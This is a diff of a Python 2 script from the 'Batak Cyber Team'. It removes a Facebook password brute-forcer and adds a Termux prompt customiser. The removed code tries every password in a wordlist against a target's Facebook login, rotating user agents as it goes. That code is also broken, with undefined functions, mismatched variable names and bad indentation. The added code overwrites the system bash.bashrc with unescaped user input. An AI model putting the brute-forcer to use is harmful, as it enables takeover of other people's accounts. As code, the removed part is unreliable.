@@ -1,190 +1,359 @@
-#!usr
 # -*- coding: UTF-8 -*-
-# mod by: iNicoleus F Sitorus
-# team: Batak Cyber Team
-
+# Author: Nicoleus Sitorus
+# Team: Batak Cyber Team
 
 import os
 import sys
 import time
-import random
-import cookielib
-import mechanize
-
-wd = "\033[90;1m" # dark
-GL = "\033[96;1m" # Blue aqua
-BB = "\033[34;1m" # Blue light
-YY = "\033[33;1m" # Yellow light
-GG = "\033[32;1m" # Green light
-WW = "\033[0;1m"  # White light
-RR = "\033[31;1m" # Red light
-CC = "\033[36;1m" # Cyan light
-B = "\033[34m"    # Blue
-Y = "\033[33;1m"    # Yellow
-G = "\033[32m"    # Green
-W = "\033[0;1m"     # White
-R = "\033[31m"    # Red
-C = "\033[36;1m"    # Cyan
-
-def runntxt(s):
-        for noobs in s + '\n':
-                sys.stdout.write(noobs)
-                sys.stdout.flush()
-                time.sleep(10. / 2100)
 
 
+# warna
+d = "\033[90;1m"
+m = "\033[91;1m"
+h = "\033[92;1m"
+k = "\033[93;1m"
+b = "\033[94;1m"
+p = "\033[95;1m"
+a = "\033[96;1m"
+s = "\033[97;1m"
+
+
+def runntxt(noob):
+    for lol in noob + '\n':
+        sys.stdout.write(lol)
+        sys.stdout.flush()
+        time.sleep(10. / 600)
 def banner():
-    os.system('clear')
+    os.system("clear")
+    os.system("toilet -f standard 'Trmx Style OIK' -F gay")
+#    print m+"+--------------------------------------+"
+    os.system("echo '|  Author: Nicoleus Sitrous' | lolcat")
+    os.system("echo '|  Team: Batak Cyber Team' | lolcat")
+    os.system("echo '|  Youtube: adysitorusady' | lolcat")
+    os.system("echo '|  Facebook: Nicoleus Sitorus' | lolcat")
+    print m+"+------------------------------------------------+ "
+    print h+"   [\033[97m1\033[92m] \033[96mEyes Gay",h+"      [\033[97m6\033[92m] \033[96mName Lolcat"
+    print h+"   [\033[97m2\033[92m] \033[96mEyes Lolcat",h+"   [\033[97m7\033[92m] \033[96mName Gay"
+    print h+"   [\033[97m3\033[92m] \033[96mTrain Lolcat",h+"  [\033[97m8\033[92m] \033[96mNeofetch Lolcat"
+    print h+"   [\033[97m4\033[92m] \033[96mTrain Gay",h+"     [\033[97m9\033[92m] \033[96mNeofetch Gay"
     print " "
-    runntxt(GL+"             HORAS HITA SUDE ^_^")
-    runntxt(WW+'   __________                __ ')         
-    runntxt(GL+'   \______   \_______ __ ___/  |_  ____  ')
-    runntxt(GG+'    |    |  _/\_  __ \  |  \   __\/ __ \ ')
-    runntxt(WW+'    |    |   \ |  | \/  |  /|  | \  ___/ ')
-    runntxt(GG+'    |______  / |__|  |____/ |__|  \___  > ')
-    runntxt(Y+'           \/                         \/ ')
-			   
-	    
-    time.sleep(1.5)
-    print GG+"  √=============================================√"
-    print GL+"  |••••••   NEW TOOLS HACK FACEBOOK BF.   ••••••|"
-    print GG+"  √=============================================√"
-    print WW+"  |            MOD BY: Nicoleus Sitorus             |"
-    print GL+"  |       Berdoa Dulu Sebelum Menggunakan       |"
-    print WW+"  |            FACEBOOK: Nicoleus Sitorus            |"
-    print Y+"  |             YOUTUBE: adysitorusady              |"
-    print GL+"  |---------------------------------------------|"
-    print GL+"  |        LIFE OF PROGRAMMER [ L.O.P ]         |"
-    print GL+"  |---------------------------------------------|"
-    print GG+"  √=============================================√"
-    print GL+"  |•••••••••   HACK FACEBOOK MAS ^_^   •••••••••|"
-    print GG+"  √=============================================√"
+    print m+"   [\033[93m5\033[91m] \033[97mInstall Paketnya Dulu Bro Lae..!"
+    print m+"+------------------------------------------------+ "
+def pilih():
+  try:
+ 
+    print k+"╭────\033[92m[ \033[96mPilih Opsinya Lae.! \033[92m]"
+    pil = raw_input("\033[93m╰────➲\033[97m ")
+    if pil in ['1'] or pil == 'gay':
+        eyes_gay()
+    elif pil in ['2'] or pil == 'lolcat':
+        eyes_lolcat()
+    elif pil in ['3'] or pil == 'train lolcat':
+        train_lolcat()
+    elif pil in ['4'] or pil == 'train gay':
+        train_gay()
+    elif pil in ['5'] or pil == 'install':
+        install()
+    elif pil in ['6'] or pil == 'name lolcat':
+        name_lolcat()
+    elif pil in ['7'] or pil == 'name gay':
+        name_gay()
+    elif pil in ['8'] or pil == 'neofetch lol':
+        neofetch_lol()
+    elif pil in ['9'] or pil == 'neofetch gay':
+        neofetch_gay()
+    else:
+        print m+'pilih yg bener Lae...'
+        glob()
+  
+  except KeyboardInterrupt:
+    print d+"Keluar dari program..."
+    sys.exit()  
+''' 
+  except NameError Lae:
+    print "pilih cuy.."
+    glob()
+  except SyntaxError:
+    print " Masukkan pilihannya Lae.."
+    glob()
 
-banner()
-
-print wd+"         https://www.github.com/nicoleus "
-print GG+"╭────\033[91m[\033[96m Masukkan ID\033[95m / \033[96mUsername Target\033[91m ] "
-email_target = str(raw_input(GL+"\033[92m╰────➲\033[93m  "))
-print " "
-print "\033[92m╭────\033[91m[ \033[96mMasukkan File Wordlist \033[95m( pass.txt ) \033[91;1m]"
-password_list = str(raw_input(GG+"╰────➲\033[93m "))
-login = 'https://www.facebook.com/login.php?login_attempt=1'
-useragents = [('Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0','Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Geck')]
-# useragents = [('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36','Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36','Mozilla/5.0 (Windows NT 5.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36','Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36','Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36','Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36','Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36','Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36',)]
-
-def pil():
-                print GG+" "
-                g = str(raw_input("[?] Hack Fb lagi..\033[93;1m[y/n]: "))
-                if g == 'y' or g == 'Y':
-                    os.system('python2 brute.py')
-                elif g == 'n' or g == 'N':
-                    print wd+"Keluar dari program..."
-                    sys.exit()
-                else:
-                    print RR+"Pilih yang bener cuk..."
-                    pil()
-
-def edit_wordlist():
-
-        print GG+" "
-        ed = str(raw_input("[?] Edit wordlist cuk.? \033[96;1m[y/n]: "))
-        if ed == 'y' or ed == 'Y':
-                os.system('nano '+password_list)
-                pil()
-        elif ed == 'n' or ed == 'N':
-                print wd+"Keluar Dari Program..."
-                sys.exit()
-
-        else:
-                print RR+"Pilih yg bener cuk..."
-                edit_wordlist()
-
+'''
 def main():
-        global noobs
-        noobs = mechanize.Browser()
-        cj = cookielib.LWPCookieJar()
-        noobs.set_handle_robots(False)
-        noobs.set_handle_redirect(True)
-        noobs.set_cookiejar(cj)
-        noobs.set_handle_equiv(True)
-        noobs.set_handle_referer(True)
-        noobs.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
-        runn_noobs()
-        life()
-        print " "
-        print RR+" wordlist tidak ada yg cocok LAE..."
-        print " "
-def main():	
- 	sys.stdout.write(GG+"\n[\033[91m+\033[92m]\033[91;1m [\033[97m"+email_target+"\033[91m]\033[90m Mencoba ==> \033[91m[\033[90;1m"+iqbalz_password)
-	sys.stdout.flush()
-	noobs.addheaders = [('User-agent', random.choice(useragents))]
-	site = noobs.open(login)
-	noobs.select_form(nr = 0)
-	noobs.form['email'] = email_target
-	noobs.form['pass'] = nico_password
-	tom = noobs.submit()
-	mask = tom.geturl()
-	if mask != login and (not 'login_attempt' in mask):
-                        print " "
-			print ("\033[96m                S U C C E S S")
-			print "          P A S S W O R D  F I N D "
-                  	print RR+"+-------------------------------------------+"
-	         	print (RR+"#\033[97m ID / Email Target:\033[92m {}").format(email_target)
-        	        print (RR+"#\033[97m Password Target:\033[92m {}").format(nico_password)
-        	        print " "
-        	        raw_input(WW+"TEKAN ENTER UNTUK KELUAR LAE...")
-			sys.exit(1)
-  
-  
-      print wd+"Stop......."
-      edit_wordlist()
-      sys.exit()    	    
-def life():
-	global Nico_password
-	password_nob = open(password_list, "r")
-	for nico_password in password_nob:
-		password_nob = nico_password.replace("\n","")
-		nico(nico_password)		
+    banner()
+    pilih()
+def glob():
+    pilih()
 
-def runn_noobs():
-         global password_list
+def install():
+    os.system("pkg install ruby cowsay toilet figlet sl")
+    os.system("pkg install neofetch")
+    os.system("gem install lolcat")
+    main()
+def eyes_lolcat():
+    os.system("clear")
+    os.system("cowsay -f eyes 'EyesLolcat' | lolcat")
+    os.system("toilet -f standard 'Eyes Lolcat' | lolcat")
+    print a+"+---------------------------+",k+" "
+    name = str(raw_input(' [?]\033[97m Nama Pengguna:\033[92m '))
+    print a+"+---------------------------+",h+" "
+    prompt = str(raw_input(' [?]\033[95m Nama Prompt:\033[93m '))
+    print a+"+------------------------+"
+    print d+" Loading......"
+    time.sleep(1.5)
+    iqbalz = open("bash.bashrc", "w")
+    iqbalz.write("PS1='")
+    iqbalz.write("\n\e[0;32m╭────\e[0;31m[\e[0m root\e[0;32m⚔\e[0m"+prompt+"#\e[0;33m \w \e[0;31m]\e[0;32m")
+    iqbalz.write("\n╰────➲ '")
+    iqbalz.write("\nclear")
+    iqbalz.write("\ncowsay -f eyes '"+name)
+    iqbalz.write("' | lolcat")
+    iqbalz.write("\ntoilet -f standard '"+name)
+    iqbalz.write("' | lolcat")
+    iqbalz.write("\necho ' User: "+name)
+    iqbalz.write("' | lolcat")
+    iqbalz.write("\ndate | lolcat")
+    iqbalz.close()
+    os.system("rm $HOME/../usr/etc/bash.bashrc")
+    os.system("cp -f bash.bashrc $HOME/../usr/etc")
+    os.system("clear")
+    os.system("cowsay -f eyes ' Eyes Lolcat' | lolcat")
+    os.system("toilet -f standard 'Eyes Lolcat' | lolcat")
+    os.system("echo '            Powered By: Nicoleus Sitorus' | lolcat ")
+    print ' '
+    runntxt(a+"                √  S U C C E S *L A E* ✓")
+    runntxt(h+"          ✓  Silahkan Buka Sesi Baru Lae✓")
+    print " "
+   
+def eyes_gay():
+    os.system('clear')
+    os.system("cowsay -f eyes 'EyesGay' | lolcat")
+    os.system("toilet -f standard ' Eyes Gay' -F gay")
+    print a+"+---------------------------+",k+" "
+    name = str(raw_input(' [?]\033[97m Nama Pengguna:\033[92m '))
+    print a+"+---------------------------+",h+" "
+    prompt = str(raw_input(' [?]\033[95m Nama Prompt:\033[93m '))
+    print a+"+------------------------+"
+    print d+" Loading......"
+    time.sleep(1.5)
+    iqbalz = open("bash.bashrc", "w")
+    iqbalz.write("PS1='")
+    iqbalz.write("\n\e[0;32m╭────\e[0;31m[\e[0m root\e[0;32m⚔\e[0m"+prompt+"#\e[0;33m \w \e[0;31m]\e[0;32m")
+    iqbalz.write("\n╰────➲ '")
+    iqbalz.write("\nclear")
+    iqbalz.write("\ncowsay -f eyes '"+name)
+    iqbalz.write("' | lolcat")
+    iqbalz.write("\ntoilet -f standard '"+name)
+    iqbalz.write("' -F gay")
+    iqbalz.write("\ndate | lolcat")
+    iqbalz.close()
+    os.system("rm $HOME/../usr/etc/bash.bashrc")
+    os.system("cp -f bash.bashrc $HOME/../usr/etc")
+    os.system('clear')
+    os.system('clear')
+    os.system("cowsay -f eyes 'Cowsay' | lolcat")
+    os.system("toilet -f standard '   Eyes Gay' -F gay")
+    os.system("echo '            Powered By: Nicoleus Sitorus' | lolcat")
+    print ' '
+    runntxt(a+"                √  S U C C E S *L A E*✓")
+    runntxt(h+"          ✓  Silahkan Buka Sesi Baru Lae✓")
+    print " "
 
-         lop = GG+"""
+def train_lolcat():
+    os.system('clear')
+    os.system("sl")
+    os.system("toilet -f standard 'TrainLolcat' | lolcat")
+    print a+"+---------------------------+",k+" "
+    name = str(raw_input(' [?]\033[97m Nama Pengguna:\033[92m '))
+    print a+"+---------------------------+",h+" "
+    prompt = str(raw_input(' [?]\033[95m Nama Prompt:\033[93m '))
+    print a+"+------------------------+"
+    print d+" Loading......"
+    time.sleep(1.5)
+    iqbalz = open("bash.bashrc", "w")
+    iqbalz.write("PS1='")
+    iqbalz.write("\n\e[0;32m╭────\e[0;31m[\e[0m root\e[0;32m⚔\e[0m"+prompt+"#\e[0;33m \w \e[0;31m]\e[0;32m")
+    iqbalz.write("\n╰────➲ '")
+    iqbalz.write("\nclear")
+    iqbalz.write("\nsl")
+    iqbalz.write("\nclear")
+    iqbalz.write("\ntoilet -f standard '"+name)
+    iqbalz.write("' | lolcat")
+    iqbalz.write("\necho ' User: "+name)
+    iqbalz.write("' | lolcat")
+    iqbalz.write("\ndate | lolcat")
+    iqbalz.close()
+    os.system("rm $HOME/../usr/etc/bash.bashrc")
+    os.system("cp -f bash.bashrc $HOME/../usr/etc")
+    os.system("clear")
+    os.system("sl")
+    os.system("toilet -f standard 'TrainLolcat' | lolcat")
+    os.system("echo '            Powered By: Nicoleus Sitorus' | lolcat ")
+    print ' '
+    runntxt(a+"                √  S U C C E S *L A E*✓")
+    runntxt(h+"          ✓  Silahkan Buka Sesi Baru Lae✓")
+    print " "
 
-                  `.-://////:-.`
-              .:+o+:-..````..-:+o+:.
-           `:o+-`                `:+o:`
-         `/o:`                      `:o/`
-        -s/`  .-..`            `..--` `/s-
-       /o.   `:.`.-:----------:-.``:-   .o/
-      /o`    .:`    `              --    `o/
-     -s.     .:`                   --     .s-
-     o/     .:`                     --     +o
-    .s-     :.                      `:`    -s`
-    .s.     :.                      `:`    .s.
-    .s-     --                      .:     -s.
-     o/     `-.                    `-.     /o
-     -s.     `--`                `.-`     .s-
-      /o` ----``..--..`    `...--.`      `o/
-       /o. `----`  `-.      `-.         .o/
-        -o:  -.......        ..       `:o-
-         `:o:``....--        ..     `:o:`
-           `:+/-`  `-        ..  `-/+:`
-              `-/+///..````..://+/-`
-                  `.-::////::-.` \033[91;1m
+def train_gay():
+    os.system('clear')
+    os.system("sl")
+    os.system("toilet -f standard '  Train Gay' -F gay")
+    print a+"+---------------------------+",k+" "
+    name = str(raw_input(' [?]\033[97m Nama Pengguna:\033[92m '))
+    print a+"+---------------------------+",h+" "
+    prompt = str(raw_input(' [?]\033[95m Nama Prompt:\033[93m '))
+    print a+"+------------------------+"
+    print d+" Loading......"
+    time.sleep(1.5)
+    iqbalz = open("bash.bashrc", "w")
+    iqbalz.write("PS1='")
+    iqbalz.write("\n\e[0;32m╭────\e[0;31m[\e[0m root\e[0;32m⚔\e[0m"+prompt+"#\e[0;33m \w \e[0;31m]\e[0;32m")
+    iqbalz.write("\n╰────➲ '")
+    iqbalz.write("\nclear")
+    iqbalz.write("\nsl")
+    iqbalz.write("\nclear")
+    iqbalz.write("\ntoilet -f standard '"+name)
+    iqbalz.write("' -F gay")
+    iqbalz.write("\necho ' User: "+name)
+    iqbalz.write("' | lolcat")
+    iqbalz.write("\ndate | lolcat")
+    iqbalz.close()
+    os.system("rm $HOME/../usr/etc/bash.bashrc")
+    os.system("cp -f bash.bashrc $HOME/../usr/etc")
+    os.system("clear")
+    os.system("sl")
+    os.system("toilet -f standard '  Train Gay' -F gay")
+    os.system("echo '            Powered By: Nicoleus Sitorus' | lolcat ")
+    print ' '
+    runntxt(a+"                √  S U C C E S *L A E*✓")
+    runntxt(h+"          ✓  Silahkan Buka Sesi Baru Lae✓")
+    print " "
 
-                \033[90;1mLife Of Programmer\033[91;1m
-              Powered by:\033[97m Nicoleus F Sitorus
-      """
+def name_lolcat():
+    os.system('clear')   
+    os.system("toilet -f standard 'NameLolcat' | lolcat")
+    print a+"+---------------------------+",k+" "
+    name = str(raw_input(' [?]\033[97m Nama Pengguna:\033[92m '))
+    print a+"+---------------------------+",h+" "
+    prompt = str(raw_input(' [?]\033[95m Nama Prompt:\033[93m '))
+    print a+"+------------------------+"
+    print d+" Loading......"
+    time.sleep(1.5)
+    iqbalz = open("bash.bashrc", "w")
+    iqbalz.write("PS1='")
+    iqbalz.write("\n\e[0;32m╭────\e[0;31m[\e[0m root\e[0;32m⚔\e[0m"+prompt+"#\e[0;33m \w \e[0;31m]\e[0;32m")
+    iqbalz.write("\n╰────➲ '")
+    iqbalz.write("\nclear")
+    iqbalz.write("\ntoilet -f standard '"+name)
+    iqbalz.write("' | lolcat")
+    iqbalz.write("\necho ' User: "+name)
+    iqbalz.write("' | lolcat")
+    iqbalz.write("\ndate | lolcat")
+    iqbalz.close()
+    os.system("rm $HOME/../usr/etc/bash.bashrc")
+    os.system("cp -f bash.bashrc $HOME/../usr/etc")
+    os.system("clear")
+    os.system("toilet -f standard 'NameLolcat' | lolcat")
+    os.system("echo '            Powered By: Nicoleus Sitorus' | lolcat ")
+    print ' '
+    runntxt(a+"                √  S U C C E S *L A E* ✓")
+    runntxt(h+"          ✓  Silahkan Buka Sesi Baru Lae✓")
+    print " "
+
+def name_gay():
+    os.system('clear')
+    os.system("toilet -f standard '  Name Gay' -F gay")
+    print a+"+---------------------------+",k+" "
+    name = str(raw_input(' [?]\033[97m Nama Pengguna:\033[92m '))
+    print a+"+---------------------------+",h+" "
+    prompt = str(raw_input(' [?]\033[95m Nama Prompt:\033[93m '))
+    print a+"+------------------------+"
+    print d+" Loading......"
+    time.sleep(1.5)
+    iqbalz = open("bash.bashrc", "w")
+    iqbalz.write("PS1='")
+    iqbalz.write("\n\e[0;32m╭────\e[0;31m[\e[0m root\e[0;32m⚔\e[0m"+prompt+"#\e[0;33m \w \e[0;31m]\e[0;32m")
+    iqbalz.write("\n╰────➲ '")
+    iqbalz.write("\nclear")
+    iqbalz.write("\ntoilet -f standard '"+name)
+    iqbalz.write("' -F gay")
+    iqbalz.write("\necho ' User: "+name)
+    iqbalz.write("' | lolcat")
+    iqbalz.write("\ndate | lolcat")
+    iqbalz.close()
+    os.system("rm $HOME/../usr/etc/bash.bashrc")
+    os.system("cp -f bash.bashrc $HOME/../usr/etc")
+    os.system("clear")
+    os.system("toilet -f standard '  Name Gay' -F gay")
+    os.system("echo '            Powered By: Nicoleus Sitorus' | lolcat ")
+    print ' '
+    runntxt(a+"                √  S U C C E S *L A E* ✓")
+    runntxt(h+"          ✓  Silahkan Buka Sesi Baru Lae✓")
+    print " "
+
+def neofetch_lol():
+    os.system('clear')
+    os.system("toilet -f standard '      Neof Lol' | lolcat")
+    os.system("neofetch")
+    print a+"+---------------------------+",k+" "
+    name = str(raw_input(' [?]\033[97m Nama Pengguna:\033[92m '))
+    print a+"+---------------------------+",h+" "
+    prompt = str(raw_input(' [?]\033[95m Nama Prompt:\033[93m '))
+    print a+"+------------------------+"
+    print d+" Loading......"
+    time.sleep(1.5)
+    iqbalz = open("bash.bashrc", "w")
+    iqbalz.write("PS1='")
+    iqbalz.write("\n\e[0;32m╭────\e[0;31m[\e[0m root\e[0;32m⚔\e[0m"+prompt+"#\e[0;33m \w \e[0;31m]\e[0;32m")
+    iqbalz.write("\n╰────➲ '")
+    iqbalz.write("\nclear")
+    iqbalz.write("\ntoilet -f standard '"+name)
+    iqbalz.write("' | lolcat")
+    iqbalz.write("\nneofetch")
+    iqbalz.write("\ndate | lolcat")
+    iqbalz.close()
+    os.system("rm $HOME/../usr/etc/bash.bashrc")
+    os.system("cp -f bash.bashrc $HOME/../usr/etc")
+    os.system("clear")
+    os.system("neofetch")
+    os.system("toilet -f standard '      Neof Lol' | lolcat")
+    os.system("echo '            Powered By: Nicoleus Sitorus' | lolcat ")
+    print ' '
+    runntxt(a+"                √  S U C C E S *L A E* ✓")
+    runntxt(h+"          ✓  Silahkan Buka Sesi Baru Lae✓")
+    print " "
 
 
-         print lop
-         nuub = open(password_list, 'r')
-         nuub = nuub.readlines()
-         print wd+" [#] ID / Username Target\033[97;1m: {}".format(email_target)
-         print wd+" [#] JUmlah Password saat ini\033[97;1m:", len(nuub),'password'
-         print wd+" [#] Tunggu Proses Cracking\033[97;1m.........."
-         print " "
+def neofetch_gay():   
+    os.system('clear')
+    os.system("toilet -f standard '     Neof Gay' -F gay")                 
+    os.system("neofetch")
+    print a+"+---------------------------+",k+" "
+    name = str(raw_input(' [?]\033[97m Nama Pengguna:\033[92m '))
+    print a+"+---------------------------+",h+" "
+    prompt = str(raw_input(' [?]\033[95m Nama Prompt:\033[93m '))
+    print a+"+------------------------+"
+    print d+" Loading......"
+    time.sleep(1.5)      
+    iqbalz = open("bash.bashrc", "w")
+    iqbalz.write("PS1='")
+    iqbalz.write("\n\e[0;32m╭────\e[0;31m[\e[0m root\e[0;32m⚔\e[0m"+prompt+"#\e[0;33m \w \e[0;31m]\e[0;32m")
+    iqbalz.write("\n╰────➲ '")
+    iqbalz.write("\nclear")
+    iqbalz.write("\ntoilet -f standard '"+name)
+    iqbalz.write("' -F gay")
+    iqbalz.write("\nneofetch")
+    iqbalz.write("\ndate | lolcat")
+    iqbalz.close()
+    os.system("rm $HOME/../usr/etc/bash.bashrc")
+    os.system("cp -f bash.bashrc $HOME/../usr/etc")
+    os.system("clear")
+    os.system("neofetch")
+    os.system("toilet -f standard '     Neof Gay' -F gay")
+    os.system("echo '            Powered By: Nicoleus F Sitorus' | lolcat ")
+    print ' '
+    runntxt(a+"                √  S U C C E S *L A E*✓")
+    runntxt(h+"          ✓  Silahkan Buka Sesi Baru Lae✓")
+    print " "
 
 if __name__=='__main__':
-	main()	
+    main()
